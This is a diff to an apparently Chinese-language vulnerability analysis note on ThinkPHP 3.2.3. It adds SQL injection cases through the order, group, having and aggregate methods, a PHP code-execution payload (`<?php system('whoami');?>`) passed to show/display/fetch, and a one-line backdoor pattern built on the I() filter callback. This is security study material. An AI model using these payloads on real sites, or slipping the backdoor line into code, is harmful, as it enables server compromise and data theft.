@@ -6,6 +6,8 @@
 
 [Thinkphp多个版本注入分析](https://hu3sky.github.io/2019/09/24/Thinkphp%E5%A4%9A%E7%89%88%E6%9C%AC%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/)
 
+[水文-Thinkphp3.2.3安全开发须知](https://xz.aliyun.com/t/2630)
+
 ## cms组成
 
 ```
@@ -1189,11 +1191,193 @@ thinkphp通过`__call`方法实现特殊方法
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201536130.png)
 
-`$args[0]`没有经过任何过滤就被传入到`$this->options['order']`中
+`$args[0]`没有经过任何过滤就被传入到`$this->options['order']`中,而同样在`parseOrder`中没有经过任何过滤就拼接到sql语句中
+
+```php
+    protected function parseOrder($order) {
+        if(is_array($order)) {
+            $array   =  array();
+            foreach ($order as $key=>$val){
+                if(is_numeric($key)) {
+                    $array[] =  $this->parseKey($val);
+                }else{
+                    $array[] =  $this->parseKey($key).' '.$val;
+                }
+            }
+            $order   =  implode(',',$array);
+        }
+        return !empty($order)?  ' ORDER BY '.$order:'';
+    }
+```
 
 接下来的利用方法就跟前面提到的`find()`注入差不多
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201538087.png)
+
+### group注入
+
+```php
+<?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $User = M("user"); // 实例化User对象
+        $group = I('GET.group');
+        $res = $User->group($group)->find();
+    }
+}
+```
+
+```php
+    protected function parseGroup($group) {
+        return !empty($group)? ' GROUP BY '.$group:'';
+    }
+```
+
+利用方法同上
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211302496.png)
+
+### having注入
+
+```php
+<?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $User = M("user"); // 实例化User对象
+        $having = I('GET.having');
+        $res = $User->having($having)->find();
+    }
+}
+```
+
+```php
+    protected function parseHaving($having) {
+        return  !empty($having)?   ' HAVING '.$having:'';
+    }
+```
+
+利用方法同上
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211333888.png)
+
+### count sum min max avg注入
+
+```php
+<?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $User = M("user"); // 实例化User对象
+        $count = I('GET.count');
+        $res = $User->count($count);
+    }
+}
+```
+
+```php
+    /**
+     * 聚合查询
+     * @access public
+     * @param  string $aggregate    聚合方法
+     * @param  string $field        字段名
+     * @param  bool   $force        强制转为数字类型
+     * @return mixed
+     */
+    public function aggregate($aggregate, $field, $force = false)
+    {
+        if (!preg_match('/^[\w\.\*]+$/', $field)) {
+            throw new Exception('not support data:' . $field);
+        }
+
+        $result = $this->value($aggregate . '(' . $field . ') AS tp_' . strtolower($aggregate), 0, $force);
+
+        return $result;
+    }
+
+    /**
+     * COUNT查询
+     * @access public
+     * @param string $field 字段名
+     * @return integer|string
+     */
+    public function count($field = '*')
+    {
+        if (isset($this->options['group'])) {
+            if (!preg_match('/^[\w\.\*]+$/', $field)) {
+                throw new Exception('not support data:' . $field);
+            }
+            // 支持GROUP
+            $options = $this->getOptions();
+            $subSql  = $this->options($options)->field('count(' . $field . ')')->bind($this->bind)->buildSql();
+
+            $count = $this->table([$subSql => '_group_count_'])->value('COUNT(*) AS tp_count', 0);
+        } else {
+            $count = $this->aggregate('COUNT', $field);
+        }
+
+        return is_string($count) ? $count : (int) $count;
+
+    }
+
+    /**
+     * SUM查询
+     * @access public
+     * @param string $field 字段名
+     * @return float|int
+     */
+    public function sum($field)
+    {
+        return $this->aggregate('SUM', $field, true);
+    }
+
+    /**
+     * MIN查询
+     * @access public
+     * @param string $field 字段名
+     * @param bool   $force   强制转为数字类型
+     * @return mixed
+     */
+    public function min($field, $force = true)
+    {
+        return $this->aggregate('MIN', $field, $force);
+    }
+
+    /**
+     * MAX查询
+     * @access public
+     * @param string $field 字段名
+     * @param bool   $force   强制转为数字类型
+     * @return mixed
+     */
+    public function max($field, $force = true)
+    {
+        return $this->aggregate('MAX', $field, $force);
+    }
+
+    /**
+     * AVG查询
+     * @access public
+     * @param string $field 字段名
+     * @return float|int
+     */
+    public function avg($field)
+    {
+        return $this->aggregate('AVG', $field, true);
+    }
+```
+
+没有经过过滤就拼接到sql语句中
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203211358033.png)
+
+>除此之外还有不少sql注入同样是由于开发者错误的将用户传入的参数传递给thinkphp
+
+[水文-Thinkphp3.2.3安全开发须知](https://xz.aliyun.com/t/2630)
 
 ## 缓存getshell
 
@@ -1282,4 +1466,71 @@ phpinfo();//";
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203201621121.png)
 
->tofinish
+## 特殊情况下造成命令执行
+
+1. `$this->show`和`$this->display`
+
+```php
+<?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $info = I('GET.info');
+        $this->show($info);
+        $this->display('','','',$info);
+        $info = I('GET.info','','');#没有对<和>进行转义
+        $this->show($info);
+        $this->display('','','',$info);
+    }
+}
+```
+
+`info=<?php system('whoami');?>`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202114626.png)
+
+在`Application/Runtime/Cache/Home`会生成对应的模板文件
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202115270.png)
+
+2. `$this->fetch`
+
+```php
+<?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $info = I('GET.info');
+        $template=$this->fetch('',$info);
+        var_dump($template);
+        $info = I('GET.info','','');#没有对<和>进行转义
+        $template=$this->fetch('',$info);
+        var_dump($template);
+    }
+}
+```
+
+`info=<?php system('whoami');?>`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202120318.png)
+
+在`Application/Runtime/Cache/Home`会生成对应的模板文件
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202120521.png)
+
+3. 利用`I`函数留下后面
+
+```php
+<?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        I('POST.info','',I('GET.info'));
+    }
+}
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203202146980.png)
